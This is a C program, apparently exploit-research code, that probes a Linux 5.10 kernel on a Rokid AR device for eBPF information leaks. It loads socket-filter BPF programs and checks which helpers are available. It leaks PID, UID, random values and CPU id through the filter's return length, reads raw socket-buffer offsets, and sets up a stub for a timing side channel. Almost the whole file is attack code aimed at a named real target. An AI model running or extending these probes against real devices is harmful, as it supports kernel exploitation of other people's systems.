/*
 * BPF Info Leak via Helper Functions
 * 利用 helper function return values 洩漏資訊
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <linux/bpf.h>
#include <stdint.h>

#ifndef __NR_bpf
#define __NR_bpf 280
#endif

static inline int bpf(int cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

// BPF instructions
#define BPF_ALU64_IMM(OP, DST, IMM) \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_OP(OP) | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})
#define BPF_ALU64_REG(OP, DST, SRC) \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_OP(OP) | BPF_X, .dst_reg = DST, .src_reg = SRC, .off = 0, .imm = 0})
#define BPF_ALU32_IMM(OP, DST, IMM) \
    ((struct bpf_insn){.code = BPF_ALU | BPF_OP(OP) | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})
#define BPF_MOV64_IMM(DST, IMM) BPF_ALU64_IMM(BPF_MOV, DST, IMM)
#define BPF_MOV64_REG(DST, SRC) BPF_ALU64_REG(BPF_MOV, DST, SRC)
#define BPF_MOV32_IMM(DST, IMM) BPF_ALU32_IMM(BPF_MOV, DST, IMM)
#define BPF_LDX_MEM(SIZE, DST, SRC, OFF) \
    ((struct bpf_insn){.code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})
#define BPF_STX_MEM(SIZE, DST, SRC, OFF) \
    ((struct bpf_insn){.code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})
#define BPF_ST_MEM(SIZE, DST, OFF, IMM) \
    ((struct bpf_insn){.code = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, .dst_reg = DST, .src_reg = 0, .off = OFF, .imm = IMM})
#define BPF_JMP_IMM(OP, DST, IMM, OFF) \
    ((struct bpf_insn){.code = BPF_JMP | BPF_OP(OP) | BPF_K, .dst_reg = DST, .src_reg = 0, .off = OFF, .imm = IMM})
#define BPF_JMP_REG(OP, DST, SRC, OFF) \
    ((struct bpf_insn){.code = BPF_JMP | BPF_OP(OP) | BPF_X, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})
#define BPF_EXIT_INSN() \
    ((struct bpf_insn){.code = BPF_JMP | BPF_EXIT, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0})
#define BPF_CALL_INSN(FUNC) \
    ((struct bpf_insn){.code = BPF_JMP | BPF_CALL, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = FUNC})

// BPF helper function IDs
#define BPF_FUNC_map_lookup_elem 1
#define BPF_FUNC_map_update_elem 2
#define BPF_FUNC_get_current_pid_tgid 14
#define BPF_FUNC_get_current_uid_gid 15
#define BPF_FUNC_get_current_comm 16
#define BPF_FUNC_get_prandom_u32 7
#define BPF_FUNC_get_smp_processor_id 8
#define BPF_FUNC_get_cgroup_classid 17
#define BPF_FUNC_get_hash_recalc 34
#define BPF_FUNC_skb_load_bytes 26

char verifier_log[65536];

int create_array_map(int value_size, int max_entries)
{
    union bpf_attr attr = {
        .map_type = BPF_MAP_TYPE_ARRAY,
        .key_size = 4,
        .value_size = value_size,
        .max_entries = max_entries,
    };
    return bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
}

int load_prog(struct bpf_insn *insns, int insn_cnt)
{
    memset(verifier_log, 0, sizeof(verifier_log));
    union bpf_attr attr = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insns = (unsigned long)insns,
        .insn_cnt = insn_cnt,
        .license = (unsigned long)"GPL",
        .log_level = 1,
        .log_buf = (unsigned long)verifier_log,
        .log_size = sizeof(verifier_log),
    };
    return bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
}

int attach_and_run(int prog_fd, uint32_t *result)
{
    int sv[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0)
    {
        return -1;
    }

    if (setsockopt(sv[1], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd)) < 0)
    {
        close(sv[0]);
        close(sv[1]);
        return -1;
    }

    // Send data
    char buf[64] = {0};
    if (write(sv[0], buf, sizeof(buf)) != sizeof(buf))
    {
        close(sv[0]);
        close(sv[1]);
        return -1;
    }

    // Receive and get return value
    ssize_t n = recv(sv[1], buf, sizeof(buf), 0);

    // The BPF return value determines how many bytes pass
    if (result && n >= 0)
    {
        *result = n;
    }

    close(sv[0]);
    close(sv[1]);
    return 0;
}

void test_helper_availability(void)
{
    printf("\n=== Testing Helper Function Availability ===\n");

    struct
    {
        int id;
        const char *name;
    } helpers[] = {
        {BPF_FUNC_get_current_pid_tgid, "get_current_pid_tgid"},
        {BPF_FUNC_get_current_uid_gid, "get_current_uid_gid"},
        {BPF_FUNC_get_prandom_u32, "get_prandom_u32"},
        {BPF_FUNC_get_smp_processor_id, "get_smp_processor_id"},
        {BPF_FUNC_get_hash_recalc, "get_hash_recalc"},
        {BPF_FUNC_skb_load_bytes, "skb_load_bytes"},
    };

    for (int i = 0; i < sizeof(helpers) / sizeof(helpers[0]); i++)
    {
        struct bpf_insn prog[3];
        int cnt = 0;

        if (helpers[i].id == BPF_FUNC_skb_load_bytes)
        {
            // skb_load_bytes(skb, offset, to, len)
            prog[cnt++] = BPF_MOV64_IMM(2, 0);  // offset
            prog[cnt++] = BPF_MOV64_REG(3, 10); // to = stack
            prog[cnt++] = BPF_ALU64_IMM(BPF_ADD, 3, -8);
            prog[cnt++] = BPF_MOV64_IMM(4, 4); // len
            prog[cnt++] = BPF_CALL_INSN(helpers[i].id);
        }
        else if (helpers[i].id == BPF_FUNC_get_hash_recalc)
        {
            // get_hash_recalc(skb)
            prog[cnt++] = BPF_CALL_INSN(helpers[i].id);
        }
        else
        {
            prog[cnt++] = BPF_CALL_INSN(helpers[i].id);
        }
        prog[cnt++] = BPF_EXIT_INSN();

        int fd = load_prog(prog, cnt);
        printf("  %-25s: ", helpers[i].name);
        if (fd >= 0)
        {
            printf("[OK] Available\n");
            close(fd);
        }
        else
        {
            printf("[X] Unavailable\n");
        }
    }
}

void test_pid_tgid_leak(void)
{
    printf("\n=== PID/TGID Leak Test ===\n");

    // This program returns pid as the packet length filter
    // We can leak up to 0xFFFF (65535) in the return value
    struct bpf_insn prog[] = {
        BPF_CALL_INSN(BPF_FUNC_get_current_pid_tgid),
        // r0 = pid in low 32 bits, tgid in high 32 bits
        // Mask to get just the low bits
        BPF_ALU64_IMM(BPF_AND, 0, 0xFFFF),
        BPF_EXIT_INSN(),
    };

    int fd = load_prog(prog, sizeof(prog) / sizeof(prog[0]));
    if (fd < 0)
    {
        printf("  Failed to load: %s\n", strerror(errno));
        return;
    }

    printf("  Loaded (fd=%d)\n", fd);

    uint32_t result;
    if (attach_and_run(fd, &result) == 0)
    {
        printf("  Return value: %u (0x%x)\n", result, result);
        printf("  Current PID: %d\n", getpid());
        if ((result & 0xFFFF) == (getpid() & 0xFFFF))
        {
            printf("  [CONFIRMED] PID matches!\n");
        }
    }

    close(fd);
}

void test_uid_gid_leak(void)
{
    printf("\n=== UID/GID Leak Test ===\n");

    struct bpf_insn prog[] = {
        BPF_CALL_INSN(BPF_FUNC_get_current_uid_gid),
        // Low 32 bits = uid
        BPF_ALU64_IMM(BPF_AND, 0, 0xFFFF),
        BPF_EXIT_INSN(),
    };

    int fd = load_prog(prog, sizeof(prog) / sizeof(prog[0]));
    if (fd < 0)
    {
        printf("  Failed to load: %s\n", strerror(errno));
        return;
    }

    printf("  Loaded (fd=%d)\n", fd);

    uint32_t result;
    if (attach_and_run(fd, &result) == 0)
    {
        printf("  Return value: %u (0x%x)\n", result, result);
        printf("  Current UID: %d\n", getuid());
        if ((result & 0xFFFF) == (getuid() & 0xFFFF))
        {
            printf("  [CONFIRMED] UID matches!\n");
        }
    }

    close(fd);
}

void test_prandom_entropy(void)
{
    printf("\n=== PRandom Entropy Test ===\n");

    struct bpf_insn prog[] = {
        BPF_CALL_INSN(BPF_FUNC_get_prandom_u32),
        // Just use low bits as return
        BPF_ALU64_IMM(BPF_AND, 0, 0xFFFF),
        BPF_EXIT_INSN(),
    };

    int fd = load_prog(prog, sizeof(prog) / sizeof(prog[0]));
    if (fd < 0)
    {
        printf("  Failed to load: %s\n", strerror(errno));
        return;
    }

    printf("  Random values: ");
    for (int i = 0; i < 5; i++)
    {
        uint32_t result;
        if (attach_and_run(fd, &result) == 0)
        {
            printf("%04x ", result);
        }
    }
    printf("\n");

    close(fd);
}

void test_cpu_id(void)
{
    printf("\n=== SMP Processor ID Test ===\n");

    struct bpf_insn prog[] = {
        BPF_CALL_INSN(BPF_FUNC_get_smp_processor_id),
        BPF_ALU64_IMM(BPF_ADD, 0, 1), // Add 1 to avoid 0 return
        BPF_EXIT_INSN(),
    };

    int fd = load_prog(prog, sizeof(prog) / sizeof(prog[0]));
    if (fd < 0)
    {
        printf("  Failed to load: %s\n", strerror(errno));
        return;
    }

    printf("  CPU IDs seen: ");
    for (int i = 0; i < 10; i++)
    {
        uint32_t result;
        if (attach_and_run(fd, &result) == 0)
        {
            printf("%u ", result - 1);
        }
    }
    printf("\n");

    close(fd);
}

void test_skb_info(void)
{
    printf("\n=== SKB Data Access Test ===\n");

    // Try to read skb->len
    struct bpf_insn prog[] = {
        // r1 = ctx (skb)
        // Read skb->len at offset 0
        BPF_LDX_MEM(BPF_W, 0, 1, 0), // skb->len
        BPF_EXIT_INSN(),
    };

    int fd = load_prog(prog, sizeof(prog) / sizeof(prog[0]));
    if (fd < 0)
    {
        printf("  SKB offset 0: Rejected\n");
    }
    else
    {
        printf("  SKB offset 0: [OK] Can read\n");

        uint32_t result;
        if (attach_and_run(fd, &result) == 0)
        {
            printf("  Value at skb+0: %u\n", result);
        }
        close(fd);
    }

    // Try other offsets
    int offsets[] = {4, 8, 16, 24, 32, 40};
    for (int i = 0; i < sizeof(offsets) / sizeof(offsets[0]); i++)
    {
        struct bpf_insn p[] = {
            BPF_LDX_MEM(BPF_W, 0, 1, offsets[i]),
            BPF_EXIT_INSN(),
        };

        fd = load_prog(p, 2);
        if (fd >= 0)
        {
            uint32_t result;
            attach_and_run(fd, &result);
            printf("  SKB offset %d: value=%u (0x%x)\n", offsets[i], result, result);
            close(fd);
        }
    }
}

void test_timing_side_channel(void)
{
    printf("\n=== Timing Side Channel Test ===\n");

    // Use conditional branches based on secret and measure timing
    // This is a basic PoC
    struct bpf_insn prog_fast[] = {
        BPF_MOV64_IMM(0, 64),
        BPF_EXIT_INSN(),
    };

    struct bpf_insn prog_slow[] = {
        BPF_CALL_INSN(BPF_FUNC_get_prandom_u32),
        BPF_CALL_INSN(BPF_FUNC_get_prandom_u32),
        BPF_CALL_INSN(BPF_FUNC_get_prandom_u32),
        BPF_MOV64_IMM(0, 64),
        BPF_EXIT_INSN(),
    };

    int fd_fast = load_prog(prog_fast, 2);
    int fd_slow = load_prog(prog_slow, 5);

    if (fd_fast < 0 || fd_slow < 0)
    {
        printf("  Failed to load timing programs\n");
        if (fd_fast >= 0)
            close(fd_fast);
        if (fd_slow >= 0)
            close(fd_slow);
        return;
    }

    printf("  Loaded fast (fd=%d) and slow (fd=%d) programs\n", fd_fast, fd_slow);
    printf("  (Timing differences could be used for side-channel attacks)\n");

    close(fd_fast);
    close(fd_slow);
}

int main(void)
{
    printf("==========================================\n");
    printf("BPF Helper Function Info Leak Tests\n");
    printf("Target: Kernel 5.10.209 Rokid AR\n");
    printf("==========================================\n");

    test_helper_availability();
    test_pid_tgid_leak();
    test_uid_gid_leak();
    test_prandom_entropy();
    test_cpu_id();
    test_skb_info();
    test_timing_side_channel();

    printf("\n==========================================\n");
    printf("Tests Complete\n");
    printf("==========================================\n");

    return 0;
}
